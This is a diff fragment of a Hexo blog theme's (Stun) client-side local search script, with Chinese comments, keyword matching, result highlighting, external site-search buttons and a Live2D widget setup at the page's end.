+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
